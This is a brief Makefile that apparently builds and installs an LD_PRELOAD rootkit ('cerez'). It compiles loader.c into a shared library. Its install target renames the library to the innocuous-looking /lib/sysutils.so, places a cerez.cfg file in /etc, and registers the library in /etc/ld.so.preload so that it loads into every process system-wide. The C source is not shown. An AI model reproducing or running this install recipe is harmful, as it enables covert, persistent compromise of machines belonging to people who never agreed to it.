SRCS = $(wildcard *.c)

loader.so: $(SRCS)
	gcc -shared -fPIC loader.c -o loader.so -ldl -nostartfiles

install:
	cp cerez.cfg /etc/cerez.cfg
	cp loader.so /lib/sysutils.so 
	echo /lib/sysutils.so > /etc/ld.so.preload
